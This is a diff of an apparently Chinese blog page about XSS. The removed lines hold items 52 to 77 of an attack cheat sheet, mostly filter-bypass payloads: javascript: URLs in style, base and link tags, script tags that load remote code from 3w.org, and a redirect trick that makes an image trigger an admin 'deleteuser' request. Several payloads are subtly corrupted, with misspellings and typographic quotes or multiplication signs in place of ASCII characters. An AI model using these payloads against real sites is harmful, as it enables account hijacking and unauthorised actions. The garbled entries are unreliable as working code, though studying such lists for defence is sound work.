-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;STYLE&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(52)IMG STYLE方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exppression(alert(&quot;XSS&quot;))&apos;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(53)STYLE background</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;STYLE&gt;&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)&#125;&lt;/STYLE&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(54)BASE</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;EMBED SRC=&quot;http://3w.org/XSS/xss.swf&quot; &gt;&lt;/EMBED&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(56)在flash中使用ActionScrpt可以混进你XSS的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=&quot;get&quot;;</span><br><span class="line"></span><br><span class="line">b=&quot;URL(\&quot;&quot;;</span><br><span class="line"></span><br><span class="line">c=&quot;javascript:&quot;;</span><br><span class="line"></span><br><span class="line">d=&quot;alert(&apos;XSS&apos;);\&quot;)&quot;;</span><br><span class="line"></span><br><span class="line">eval_r(a+b+c+d);</span><br></pre></td></tr></table></figure>
-
-<p>(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML xmlns:xss&gt;</span><br><span class="line"></span><br><span class="line">&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://3w.org/XSS/xss.htc&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;</span><br><span class="line"></span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(58)如果过滤了你的JS你可以在图片里添加JS代码来利用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT SRC=&quot;&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(59)IMG嵌入式命令,可执行任意命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;http://www.a.com/a.php?a=b&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(60)IMG嵌入式命令(a.jpg在同服务器)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Redirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser</span><br></pre></td></tr></table></figure>
-
-<p>(61)绕符号过滤</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(62)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(63)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; &quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(64)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(65)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT a=`&gt;` SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(66)12-7-1 T00LS - Powered by Discuz! Board</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.a.com/viewthread.php?action=printable&amp;tid=15267 4/6</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&apos;&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(67)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://3w.org/xss.js&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(68)URL绕行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;http://127.0.0.1/&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(69)URL编码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;http://3w.org&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(70)IP十进制</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;http://3232235521″&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(71)IP十六进制</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;http://0xc0.0xa8.0×00.0×01″&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(72)IP八进制</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;http://0300.0250.0000.0001″&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(73)混合编码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;http://6 6.000146.0×7.147/&quot;&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(74)节省[http:]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(75)节省[www]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(76)绝对点绝对DNS</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(77)javascript链接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
       
     </div>
 
@@ -953,7 +736,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS漏洞基础"><span class="nav-number">1.</span> <span class="nav-text">XSS漏洞基础</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS入门介绍"><span class="nav-number">1.0.1.</span> <span class="nav-text">XSS入门介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解析器如何工作"><span class="nav-number">1.0.2.</span> <span class="nav-text">解析器如何工作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTML-entities（HTML-实体）"><span class="nav-number">1.0.3.</span> <span class="nav-text">HTML entities（HTML 实体）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#浏览器如何解码（Freebuf博主）"><span class="nav-number">1.0.4.</span> <span class="nav-text">浏览器如何解码（Freebuf博主）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS漏洞复现"><span class="nav-number">1.0.5.</span> <span class="nav-text">XSS漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DVWA安装："><span class="nav-number">1.0.6.</span> <span class="nav-text">DVWA安装：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DVWA靶场游玩攻略（XSS）："><span class="nav-number">1.0.7.</span> <span class="nav-text">DVWA靶场游玩攻略（XSS）：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS平台搭建"><span class="nav-number">1.0.8.</span> <span class="nav-text">XSS平台搭建</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS漏洞挖掘"><span class="nav-number">2.</span> <span class="nav-text">XSS漏洞挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS-game"><span class="nav-number">2.0.1.</span> <span class="nav-text">XSS game</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Hack-me"><span class="nav-number">2.0.2.</span> <span class="nav-text">Hack me</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSStrike"><span class="nav-number">2.0.3.</span> <span class="nav-text">XSStrike</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于DOM的XSS模糊测试论文（基础打好后再看）"><span class="nav-number">2.0.4.</span> <span class="nav-text">基于DOM的XSS模糊测试论文（基础打好后再看）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#附常见的XSS攻击方法"><span class="nav-number">3.</span> <span class="nav-text">附常见的XSS攻击方法</span></a></li></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS漏洞基础"><span class="nav-number">1.</span> <span class="nav-text">XSS漏洞基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS入门介绍"><span class="nav-number">1.1.</span> <span class="nav-text">XSS入门介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解析器如何工作"><span class="nav-number">1.2.</span> <span class="nav-text">解析器如何工作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML-entities（HTML-实体）"><span class="nav-number">1.3.</span> <span class="nav-text">HTML entities（HTML 实体）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#浏览器如何解码（Freebuf博主）"><span class="nav-number">1.4.</span> <span class="nav-text">浏览器如何解码（Freebuf博主）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS漏洞复现"><span class="nav-number">1.5.</span> <span class="nav-text">XSS漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DVWA安装："><span class="nav-number">1.6.</span> <span class="nav-text">DVWA安装：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DVWA靶场游玩攻略（XSS）："><span class="nav-number">1.7.</span> <span class="nav-text">DVWA靶场游玩攻略（XSS）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS平台搭建"><span class="nav-number">1.8.</span> <span class="nav-text">XSS平台搭建</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS漏洞挖掘"><span class="nav-number">2.</span> <span class="nav-text">XSS漏洞挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS-game"><span class="nav-number">2.1.</span> <span class="nav-text">XSS game</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hack-me"><span class="nav-number">2.2.</span> <span class="nav-text">Hack me</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSStrike"><span class="nav-number">2.3.</span> <span class="nav-text">XSStrike</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于DOM的XSS模糊测试论文（基础打好后再看）"><span class="nav-number">2.4.</span> <span class="nav-text">基于DOM的XSS模糊测试论文（基础打好后再看）</span></a></li></ol></li></ol></div>
             
 
           </div>
